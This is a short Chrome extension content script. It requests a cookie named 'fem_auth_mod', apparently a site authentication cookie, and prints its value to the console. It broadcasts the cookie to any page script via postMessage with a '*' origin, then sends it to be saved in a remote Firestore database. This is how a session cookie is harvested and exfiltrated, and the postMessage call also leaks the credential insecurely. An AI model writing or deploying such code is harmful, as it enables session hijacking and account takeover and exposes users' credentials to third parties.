// Function to request a cookie from the background script
console.log("Content script running");

function requestCookie(name, callback) {
  chrome.runtime.sendMessage({ action: "getCookie", name: name }, callback);
}

// Example of use:
requestCookie("fem_auth_mod", (response) => {
  if (response && response.cookie) {
    console.log("Cookie value:", response.cookie.value);
    // Send a message to the sandbox to perform Firebase operations
    window.postMessage(
      { action: "saveCookieToFirestore", cookieData: response.cookie },
      "*"
    );
    // Now send a message to save this cookie to Firestore
    chrome.runtime.sendMessage(
      { action: "saveCookieToFirestore", cookie: response.cookie },
      (saveResponse) => {
        if (saveResponse && saveResponse.status === "success") {
          console.log("Cookie successfully saved to Firestore");
        } else {
          console.error(
            "Failed to save cookie to Firestore:",
            saveResponse.error
          );
        }
      }
    );
  } else {
    console.log("Cookie not found");
  }
});
